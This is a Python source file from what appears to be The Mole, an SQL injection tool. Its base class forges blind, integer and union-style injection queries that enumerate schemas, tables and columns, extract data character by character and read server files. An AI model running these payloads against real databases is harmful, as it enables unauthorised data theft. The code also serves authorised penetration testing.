#!/usr/bin/python3
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.
#
# Developed by: Nasel(http://www.nasel.com.ar)
#
# Authors:
# Matías Fontanini
# Santiago Alessandri
# Gastón Traberg

import re

class DbmsMole():
    field_finger_str = 'The_Mole.F1nger!'
    error_strings = [
                        "Error: Unknown column '(\d+)' in 'order clause'",
                        "SQLSTATE\[\d+\]",
                        "Warning: pg_exec\(\): Query failed: ERROR:"
                    ]

    error_filters = [
                        re.compile("<br />\n<b>Warning</b>:  mysql_fetch_array\(\): supplied argument is not a valid MySQL result resource in <b>([\w\./]+)</b> on line <b>(\d+)</b><br />"),
                        re.compile("<br />\n<b>Warning</b>:  mysql_num_rows\(\): supplied argument is not a valid MySQL result resource in <b>([\w\./]+)</b> on line <b>(\d+)</b><br />"),
                    ]

    def injectable_field_fingers(cls, base):
        pass

    @classmethod
    def remove_errors(cls, data):
        for i in DbmsMole.error_filters:
            data = i.sub('', data)
        return data

    @classmethod
    def dbms_check_blind_queries(cls):
        pass

    @classmethod
    def to_hex(cls, string):
        output = ""
        for i in string:
            output += hex(ord(i)).replace('0x', '')
        return '0x' + output

    @classmethod
    def chr_join(cls, string):
        return '||'.join(map(lambda x: 'chr(' + str(ord(x)) + ')', string))

    @classmethod
    def char_concat(cls, string):
        return '+'.join(map(lambda x: 'char(' + str(ord(x)) + ')', string))

    @classmethod
    def field_finger(cls, finger):
        return DbmsMole.field_finger_str

    @classmethod
    def dbms_name(cls):
        return ''

    @classmethod
    def is_error(cls, data):
        for i in DbmsMole.error_strings:
            if re.search(i, data):
                return True
        return False

    @classmethod
    def field_finger_query(cls, columns, finger, injectable_field):
        pass

    @classmethod
    def field_finger_trailer(cls):
        return ''

    def is_string_query(self):
        return True

    # Parses a "where condition", replacing strings within
    # single quotes(') for their representation in the current DBMS.
    def parse_condition(self, condition):
        cond = condition.split("'")
        for i in range(len(cond)):
            if i % 2 == 1:
                cond[i] = self.to_string(cond[i])
        return ''.join(cond)

    # Subclasses MUST implement this method to return a valid
    # string conversion for data in this dbms.
    def to_string(self, data):
        pass

    # Subclasses MUST implementent this method so it returns a string
    # which represents the concatenation of param fields.
    def _concat_fields(self, fields):
        pass

    def set_good_finger(self, finger):
        pass

    def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
        if len(table) > 0:
            table = ' from ' + table
            where = ' where ' + where
        else:
            where = ' '
        return ' and {op_par}' + str(value) + ' < (select ascii(substring('+self._concat_fields(fields)+', '+str(index)+', 1)) ' + table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset) + ')'

    def forge_blind_count_query(self, operator, value, table, where="1=1"):
        if len(table) > 0:
            table = ' from ' + table
            where = ' where ' + where
        else:
            where = ' '
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select count(*)  '+table+' '+self.parse_condition(where)+')'

    def forge_blind_len_query(self, operator, value, fields, table, where="1=1", offset=0):
        if len(table) > 0:
            table = ' from ' + table
            where = ' where ' + where
        else:
            where = ' '
        return ' and {op_par}' + str(value) + ' ' + operator + ' (select length('+self._concat_fields(fields)+') '+table+' ' + self.parse_condition(where) + ' limit 1 offset '+str(offset)+')'

    def schema_count_query(self, injectable_field):
        info = self._schemas_query_info()
        return self.forge_count_query(info["field"],
               info['table'], injectable_field)

    def schema_query(self, injectable_field, offset):
        info = self._schemas_query_info()
        return self.forge_query(info['field'],
               info['table'], injectable_field, offset=offset)

    def tables_like_count_query(self, db, injectable_field, table_filter):
        info = self._tables_query_info(db)
        return self.forge_count_query(info["field"],
                    info['table'], injectable_field,
                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter,
               )

    def tables_like_query(self, db, injectable_field, table_filter, offset):
        info = self._tables_query_info(db)
        return self.forge_query(info['field'],
                    info['table'], injectable_field,
                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter, offset=offset
               )

    def table_count_query(self, db, injectable_field):
        info = self._tables_query_info(db)
        return self.forge_count_query(info["field"],
                    info['table'], injectable_field,
                    info['filter'],
               )

    def table_query(self, db, injectable_field, offset):
        info = self._tables_query_info(db)
        return self.forge_query(info['field'],
                    info['table'], injectable_field,
                    info['filter'], offset=offset
               )

    def columns_count_query(self, db, table, injectable_field):
        info = self._columns_query_info(db, table)
        return self.forge_count_query(info["field"],
                    info['table'], injectable_field,
                    where=info['filter']
               )

    def columns_query(self, db, table, injectable_field, offset):
        info = self._columns_query_info(db, table)
        return self.forge_query(info['field'],
                    info['table'], injectable_field,
                    where=info['filter'],
                    offset=offset
               )

    def fields_count_query(self, db, table, injectable_field, where="1=1"):
        info = self._fields_query_info([], db, table, where)
        return self.forge_count_query('*',
                    info['table'], injectable_field,
                    where=info['filter']
               )

    def fields_query(self, db, table, fields, injectable_field, offset, where="1=1"):
        info = self._fields_query_info(fields, db, table, where)
        return self.forge_query(info['field'],
                    info['table'], injectable_field,
                    where=info['filter'],
                    offset=offset
               )

    def dbinfo_query(self, injectable_field):
        info = self._dbinfo_query_info()
        return self.forge_query(info['field'],
               info['table'], injectable_field, offset=0)

    def read_file_query(self, filename, injectable_field):
        info = self._read_file_query_info(filename)
        return self.forge_query(info['field'],
               info['table'], injectable_field)

    # Integer queries

    def schema_integer_count_query(self, injectable_field):
        info = self._schemas_query_info()
        return self.forge_integer_count_query(info["field"],
               info['table'], injectable_field)

    def schema_integer_len_query(self, injectable_field, offset):
        info = self._schemas_query_info()
        return self.forge_integer_len_query(info["field"],
               info['table'], injectable_field, offset=offset)

    def schema_integer_query(self, index, injectable_field, offset):
        info = self._schemas_query_info()
        return self.forge_integer_query(index, info['field'],
               info['table'], injectable_field, offset=offset)

    def table_integer_count_query(self, db, injectable_field):
        info = self._tables_query_info(db)
        return self.forge_integer_count_query(info["field"],
                    info['table'], injectable_field,
                    info['filter'],
               )

    def table_integer_len_query(self, db, injectable_field, offset):
        info = self._tables_query_info(db)
        return self.forge_integer_len_query(info['field'],
                    info['table'], injectable_field,
                    info['filter'], offset=offset
               )

    def table_integer_query(self, index, db, injectable_field, offset):
        info = self._tables_query_info(db)
        return self.forge_integer_query(index, info['field'],
                    info['table'], injectable_field,
                    info['filter'], offset=offset
               )

    def columns_integer_count_query(self, db, table, injectable_field):
        info = self._columns_query_info(db, table)
        return self.forge_integer_count_query(info["field"],
                    info['table'], injectable_field,
                    where=info['filter']
               )

    def columns_integer_query(self, index, db, table, injectable_field, offset):
        info = self._columns_query_info(db, table)
        return self.forge_integer_query(index, info['field'],
                    info['table'], injectable_field,
                    where=info['filter'],
                    offset=offset
               )

    def columns_integer_len_query(self, db, table, injectable_field, offset):
        info = self._columns_query_info(db, table)
        return self.forge_integer_len_query(info['field'],
                    info['table'], injectable_field,
                    where=info['filter'],
                    offset=offset
               )

    def fields_integer_count_query(self, db, table, injectable_field, where="1=1"):
        info = self._fields_query_info([], db, table, where)
        return self.forge_integer_count_query('*',
                    info['table'], injectable_field,
                    where=info['filter']
               )

    def fields_integer_query(self, index, db, table, fields, injectable_field, offset, where="1=1"):
        info = self._fields_query_info(fields, db, table, where)
        return self.forge_integer_query(index, info['field'],
                    info['table'], injectable_field,
                    where=info['filter'],
                    offset=offset
               )

    def fields_integer_len_query(self, db, table, fields, injectable_field, offset, where="1=1"):
        info = self._fields_query_info(fields, db, table, where)
        return self.forge_integer_len_query(info['field'],
                    info['table'], injectable_field,
                    where=info['filter'],
                    offset=offset
               )

    def tables_like_integer_count_query(self, db, injectable_field, table_filter):
        info = self._tables_query_info(db)
        return self.forge_integer_count_query(info["field"],
                    info['table'], injectable_field,
                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter,
               )

    def tables_like_integer_len_query(self, db, injectable_field, table_filter, offset):
        info = self._tables_query_info(db)
        return self.forge_integer_len_query(info['field'],
                    info['table'], injectable_field,
                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter, offset=offset
               )

    def tables_like_integer_query(self, index, db, injectable_field, table_filter, offset):
        info = self._tables_query_info(db)
        return self.forge_integer_query(index, info['field'],
                    info['table'], injectable_field,
                    info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter, offset=offset
               )

    def dbinfo_integer_query(self, index, injectable_field):
        info = self._dbinfo_query_info()
        return self.forge_integer_query(index, info['field'],
               info['table'], injectable_field, offset=0)

    def dbinfo_integer_len_query(self, injectable_field):
        info = self._dbinfo_query_info()
        return self.forge_integer_len_query(info['field'],
               info['table'], injectable_field, offset=0)

    def read_file_integer_len_query(self, filename, injectable_field):
        info = self._read_file_query_info(filename)
        return self.forge_integer_len_query(info['field'],
               info['table'], injectable_field)

    def read_file_integer_query(self, index, filename, injectable_field):
        info = self._read_file_query_info(filename)
        return self.forge_integer_query(index, info['field'],
               info['table'], injectable_field)

    # Blind queries


    def schema_blind_count_query(self, operator, value):
        info = self._schemas_query_info()
        return self.forge_blind_count_query(
            operator, value, info['table']
        )

    def schema_blind_len_query(self, operator, value, offset, where="1=1"):
        info = self._schemas_query_info()
        return self.forge_blind_len_query(
            operator, value, info['field'], info['table'], offset=offset, where=where
        )

    def schema_blind_data_query(self, index, value, offset, where="1=1"):
        info = self._schemas_query_info()
        return self.forge_blind_query(
            index, value, info['field'], info['table'], offset=offset, where=where
        )

    def table_blind_count_query(self, operator, value, db):
        info = self._tables_query_info(db)
        return self.forge_blind_count_query(
            operator, value, info['table'],
            where=info['filter']
        )

    def table_blind_len_query(self, operator, value, db, offset):
        info = self._tables_query_info(db)
        return self.forge_blind_len_query(
            operator, value, info['field'],
            info['table'], offset=offset, where=info['filter']
        )

    def table_blind_data_query(self, index, value, db, offset):
        info = self._tables_query_info(db)
        return self.forge_blind_query(
            index, value, info['field'], info['table'],
            offset=offset, where=info['filter']
        )

    def tables_like_blind_count_query(self, operator, value, db, table_filter):
        info = self._tables_query_info(db)
        return self.forge_blind_count_query(
            operator, value, info['table'],
            where=info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter
        )

    def tables_like_blind_len_query(self, operator, value, db, table_filter, offset):
        info = self._tables_query_info(db)
        return self.forge_blind_len_query(
            operator, value, info['field'],
            info['table'], offset=offset, where=info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter
        )

    def tables_like_blind_data_query(self, index, value, db, table_filter, offset):
        info = self._tables_query_info(db)
        return self.forge_blind_query(
            index, value, info['field'], info['table'],
            offset=offset, where=info['filter'] + ' and ' + info["field"][0] + ' like ' + table_filter
        )

    def columns_blind_count_query(self, operator, value, db, table):
        info = self._columns_query_info(db, table)
        return self.forge_blind_count_query(
            operator, value, info['table'],
            where=info['filter']
        )

    def columns_blind_len_query(self, operator, value, db, table, offset):
        info = self._columns_query_info(db, table)
        return self.forge_blind_len_query(
            operator, value, info['field'],
            info['table'], offset=offset,
            where=info['filter']
        )

    def columns_blind_data_query(self, index, value, db, table, offset):
        info = self._columns_query_info(db, table)
        return self.forge_blind_query(
            index, value, info['field'], info['table'],
            offset=offset, where=info['filter']
        )

    def fields_blind_count_query(self, operator, value, db, table, where="1=1"):
        info = self._fields_query_info([], db, table, where)
        return self.forge_blind_count_query(
            operator, value, info['table'],
            where=where
        )

    def fields_blind_len_query(self, operator, value, fields, db, table, offset, where="1=1"):
        info = self._fields_query_info(fields, db, table, where)
        return self.forge_blind_len_query(
            operator, value, fields,
            info['table'], offset=offset, where=info['filter']
        )

    def fields_blind_data_query(self, index, value, fields, db, table, offset, where="1=1"):
        info = self._fields_query_info(fields, db, table, where)
        return self.forge_blind_query(
            index, value, fields,
            info['table'], offset=offset, where=info['filter']
        )

    def dbinfo_blind_len_query(self, operator, value):
        info = self._dbinfo_query_info()
        return self.forge_blind_len_query(
            operator, value, info['field'], info['table']
        )

    def dbinfo_blind_data_query(self, index, value):
        info = self._dbinfo_query_info()
        return self.forge_blind_query(
            index, value, info['field'], info['table']
        )

class FingerBase:
    def __init__(self, query, to_search, is_string_query = True):
        self._query = query
        self._to_search = to_search
        self.is_string_query = is_string_query

    def build_query(self):
        return self._query

    def fingers_to_search(self):
        return self._to_search

